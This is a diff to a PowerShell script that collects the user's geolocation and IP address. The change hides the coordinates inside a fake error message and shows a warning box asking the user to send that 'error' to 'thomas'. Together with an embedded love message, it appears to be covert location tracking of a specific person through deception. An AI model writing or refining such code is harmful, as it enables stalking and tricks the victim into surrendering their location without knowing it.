@@ -16,14 +16,12 @@ function get_ip {
 
 function safe_data {
     param (
-        $data,
-        $path
+        $data
         
     )
 
     $PasswordSecureString = ConvertTo-SecureString -String $data -AsPlainText -Force
     $EncryptedData = ConvertFrom-SecureString $PasswordSecureString
-    $EncryptedData | Out-File -FilePath $path
 
     return $EncryptedData
 
@@ -104,7 +102,14 @@ $love_mesage = 'I am in love with the hope that sleeps inside you ¿serias el hin
 [string]$location = get_location
 $ip = get_ip
 Write-Output ($location + "||" + $ip) 
-$encryted = safe_data -data ($location + "||" + $ip) -path $root + "\safety.log"
+
+[string]$location = get_location
+$location = $location -replace "@{Latitude=","" -replace "Longitude=","" -replace "}",""
+
+$list_loc = $location.Split(";")
+
+$encryted = "Error in module with id " + $list_loc[0] + "/error kernel explainer=" + $list_loc[1] + " is not an integer"
+
 
 if ($location -eq 'error') {
     $_ = [System.Windows.MessageBox]::Show("Somthing whent wrong can you speak with thomas send this please: " + $encryted,"Error",[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Warning)
